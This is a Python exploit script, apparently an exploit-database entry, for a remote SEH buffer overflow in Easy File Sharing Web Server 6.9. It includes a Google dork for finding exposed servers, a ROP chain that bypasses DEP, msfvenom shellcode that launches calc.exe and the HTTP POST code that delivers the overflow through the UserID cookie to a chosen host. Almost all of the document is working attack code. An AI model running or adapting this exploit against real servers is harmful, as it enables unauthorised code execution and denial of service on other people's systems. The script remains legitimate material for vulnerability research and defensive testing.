#!/usr/bin/python

# Exploit Title:    Easy File Sharing Web Server 6.9 - 'POST' msg.ghp 'UserID' Remote Buffer Overflow (SEH)(DEP Bypass + ROP)
# Google Dork:      intitle:"Login - powered by Easy File Sharing Web Server"
# Version:          6.9
# Date:             2018-09-09
# Author:           Hodorsec (hodorsec@protonmail.com)
# Vendor Homepage:  http://www.efssoft.com/
# Tested on:        Win7 x86 SP1, Win8.1 x64, Win10 build 1703 x64

# Description:      
# Exploits the '/msg.ghp' in a HTTP POST request, using the UserID variable. Although more pages are vulnerable for the UserID variable, this one specifically accepts a large request and overwrites SEH.
# Initial discovery by fuzzing with sulley / boofuzz with iterating large requests of about 60000 characters on several pages/parameters. 
# Doesn't overwrite SEH when using a more smaller amount of chars on the "msg.ghp" page. 
# The 7.2 version includes "sqlite3.dll", which gives far more ROP instructions: the 6.9 version doesn't and had to use some additional ROP instructions just using "imageload.dll" and "fsws.exe".
# Does create DoS after executing exploit payload due to memory flooding.

# Additional note:  Although version 7.2 is a newer version, 7.2 still identifies itself with HTTP server-header "Server: Easy File Sharing Web Server v6.9", just like 6.9 does.
#                   This exploit only works for 6.9                    

import socket, struct, sys, ssl, time

if len(sys.argv) != 4:
    print "Usage: " + sys.argv[0] + " <host> <port> <http/https>\n"
    print "Example: " + sys.argv[0] + " 192.168.1.1 80 http"
    print "Example: " + sys.argv[0] + " 192.168.1.1 443 https\n"
    exit()

host    = sys.argv[1]    
port    = int(sys.argv[2])
method  = sys.argv[3]

if method == "http":
    print "Trying to connect via HTTP..."
elif method == "https":
    print "Trying to connect via SSL..."
else:
    print "\nInvalid method given: enter http or https\n"
    exit()

# Size 220
# msfvenom -p windows/exec cmd=calc.exe -f python -v shellcode -b "\x00\x0d\x0a\x3b" exitfunc=thread
shellcode =  ""
shellcode += "\xb8\x1f\xc0\xf7\x3f\xd9\xcf\xd9\x74\x24\xf4\x5d"
shellcode += "\x33\xc9\xb1\x31\x31\x45\x13\x03\x45\x13\x83\xed"
shellcode += "\xe3\x22\x02\xc3\xf3\x21\xed\x3c\x03\x46\x67\xd9"
shellcode += "\x32\x46\x13\xa9\x64\x76\x57\xff\x88\xfd\x35\x14"
shellcode += "\x1b\x73\x92\x1b\xac\x3e\xc4\x12\x2d\x12\x34\x34"
shellcode += "\xad\x69\x69\x96\x8c\xa1\x7c\xd7\xc9\xdc\x8d\x85"
shellcode += "\x82\xab\x20\x3a\xa7\xe6\xf8\xb1\xfb\xe7\x78\x25"
shellcode += "\x4b\x09\xa8\xf8\xc0\x50\x6a\xfa\x05\xe9\x23\xe4"
shellcode += "\x4a\xd4\xfa\x9f\xb8\xa2\xfc\x49\xf1\x4b\x52\xb4"
shellcode += "\x3e\xbe\xaa\xf0\xf8\x21\xd9\x08\xfb\xdc\xda\xce"
shellcode += "\x86\x3a\x6e\xd5\x20\xc8\xc8\x31\xd1\x1d\x8e\xb2"
shellcode += "\xdd\xea\xc4\x9d\xc1\xed\x09\x96\xfd\x66\xac\x79"
shellcode += "\x74\x3c\x8b\x5d\xdd\xe6\xb2\xc4\xbb\x49\xca\x17"
shellcode += "\x64\x35\x6e\x53\x88\x22\x03\x3e\xc6\xb5\x91\x44"
shellcode += "\xa4\xb6\xa9\x46\x98\xde\x98\xcd\x77\x98\x24\x04"
shellcode += "\x3c\x46\xc7\x8d\x48\xef\x5e\x44\xf1\x72\x61\xb2"
shellcode += "\x35\x8b\xe2\x37\xc5\x68\xfa\x3d\xc0\x35\xbc\xae"
shellcode += "\xb8\x26\x29\xd1\x6f\x46\x78\xb2\xee\xd4\xe0\x1b"
shellcode += "\x95\x5c\x82\x63"

def create_rop_chain():
    rop_gadgets = [

  # (1a) ECX --> flProtect (0x40)
  0x1001bd98,  # POP ECX # RETN [ImageLoad.dll] 
  0xffffffff,  # Filler
    ]
    for i in range(0,65):
  # (1b) ECX --> flProtect (0x40)
        rop_gadgets += [
    0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
    0xffffffff,  # Filler 
    0xffffffff,  # Filler 
    0xffffffff,  # Filler 
        ]

    rop_gadgets += [
        # (2) EBP --> skip 4 bytes
        0x1001cbbc,  # POP EBP # RETN [ImageLoad.dll] 
        0x1001cbbc,  # skip 4 bytes [ImageLoad.dll]

        # (3) EDX --> flAllocationType (0x1000)
  # (3a) EAX --> EBX
        0x1001fab4,  # pop ebx ; xor eax, eax ; ret [ImageLoad.dll]
        0xffffffff,
  0x10015442,  # POP EAX # RETN [ImageLoad.dll]
  0xFFFFEFFE,  # -1002
  0x100231d1,  # NEG EAX # RETN [ImageLoad.dll]
  0x1001614d,  # DEC EAX # RETN [ImageLoad.dll] 
  0x1001da09,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]
  0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
  0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
  0x10015442,  # POP EAX # RETN [ImageLoad.dll]
  0x1004de84,  # &Writable location [ImageLoad.dll]
  # (3b) EBX --> EDX
  0x10022c4c,  # XOR EDX,EDX # RETN [ImageLoad.dll]
  0x10022c1e,  # ADD EDX,EBX # POP EBX # RETN 0x10 [ImageLoad.dll] 
  0xffffffff,  # Filler
  0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
        0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
  0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]

  # (4) EBX --> dwSize (0x1)
  0x100132ba,  # POP EBX # RETN [ImageLoad.dll] 
  0xffffffff,  # Filler
  0x1001f6da,  # INC EBX # ADD AL,83 # RETN [ImageLoad.dll] 
  0x1001f6da,  # INC EBX # ADD AL,83 # RETN [ImageLoad.dll] 

  # (5) EDI --> ROP NOP in EDI
  0x100194c0,  # POP EDI # RETN    ** [ImageLoad.dll] ** 
  0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
  
        # (6) ESI --> JMP [EAX]
        0x10024632,  # POP ESI # RETN [ImageLoad.dll] 
        0x10021e9d,  # JMP [EAX] [ImageLoad.dll]

        # (7) EAX --> VirtualAlloc
  0x10015442,  # POP EAX # RETN    ** [ImageLoad.dll] **
        0x1004d1fc,  # ptr to &VirtualAlloc() [IAT ImageLoad.dll]

        # (8) End chain with PUSHAD - needs JMP ESP like instruction
  0x100240c2,  # PUSHAD # RETN    ** [ImageLoad.dll] **

        # (9) Craft JMP ESP location by negating, calling via JMP EAX
        0x10015442,  # POP EAX # RETN    ** [ImageLoad.dll] **
        0xffbde9c9,  # Value to negate for 00421637 ; JMP ESP    ** [fsws.exe] **
        0x100231d1,  # NEG EAX # RET  ** [ImageLoad.dll] **
        0x10012b14,  # jmp eax   ** [ImageLoad.dll] **
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
 
rop_chain = create_rop_chain()

# Flood it
flood = 56924

# NOPsled
nopsled = "\x90" * 32

# SEH pointer, large enough to pivot and added lastly due to null-byte in address
seh = "\x1e\x3f\x46" # add esp, 0x1320; ret 0xc;   ** [fsws.exe] **

# Filler
filler = struct.pack("<I", 0x1001a858) * ((flood - len(rop_chain + nopsled + shellcode + seh)) / 4) # RETN (ROP NOP) [ImageLoad.dll]

# Building buffer
buf = filler + rop_chain + nopsled + shellcode + "\x41" * (flood - len(filler + rop_chain + nopsled + shellcode)) + seh

try:
    print "[+] Sending request with " + str(len(buf)) + " bytes..."

    httpreq = (
    "POST /msg.ghp?forumid=1&id=1 HTTP/1.1\r\n"
    "Host: " + host + ":" + str(port) + "\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "User-Agent: Mozilla/5.0\r\n"
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n"
    "Accept-Encoding: gzip, deflate\r\n"
    "Accept-Language: en-US\r\n"
    "Cookie: UserID=" + buf + "; PassWD=1234; SESSIONID=1234\r\n"
    "Connection: close\r\n\r\n"
    "userid=1234&passwd=1234&content=1234&Update=Update"
    )

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if method == "https":
        context = ssl._create_unverified_context()
        s = context.wrap_socket(s, server_hostname=host)
    s.settimeout(2)
    s.connect((host, port))
    s.send(httpreq)
    s.close()

    time.sleep(0.5)
except Exception as e:
    print(e)
    sys.exit(0)
